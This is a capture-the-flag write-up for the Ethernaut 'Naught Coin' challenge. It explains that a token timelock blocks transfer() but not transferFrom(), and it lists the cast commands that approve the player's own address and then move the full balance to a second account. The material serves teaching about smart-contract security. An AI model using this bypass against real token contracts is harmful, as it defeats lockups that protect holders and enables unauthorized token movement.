## 15 Naught Coin level

NaughtCoin is an ERC20 token and you're already holding all of them. The catch is that you'll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.

  Things that might help

*   [The ERC20 Spec](https://github.com/ethereum/ercs/blob/master/ERCS/erc-20.md)
*   [The OpenZeppelin codebase](https://github.com/OpenZeppelin/openzeppelin-contracts/tree/master/contracts)
*   [OpenZepplin implementation of ERC20.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol)

```Solidity
    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```
- The contract implementes ERC20: blocks: `transfer(...)` for the player address.  But it does not block: `transferFrom(...)`. 
- transferFrom(...) is part of the ERC20 allowance mechanism:
    1. The token holder calls approve(spender, amount) to grant an allowance.
    2. The approved spender then calls transferFrom(from, to, amount) to move the tokens 

* In this challenge, we approves their own address as spender, then uses transferFrom(...) to transfer tokens despite the timelock restriction on transfer(...).

* Check balance
```
$ cast call $INSTANCE "balanceOf(address)(uint256)" $MY_ADDR --rpc-url $RPC_URL 
1000000000000000000000000
```

* Approve
```
cast send $INSTANCE \
"approve(address,uint256)(bool)" \
$MY_ADDR \
1000000000000000000000000 \
--rpc-url $RPC_URL \
--private-key $PK
```

* Initiate Transfer
```
cast send $INSTANCE \
"transferFrom(address,address,uint256)(bool)" \
$MY_ADDR \
$SEC_ACC \
1000000000000000000000000 \
--rpc-url $RPC_URL \
--private-key $PK
```

* Verify
```
$ cast call $INSTANCE "balanceOf(address)(uint256)" $MY_ADDR --rpc-url $RPC_URL
0
```

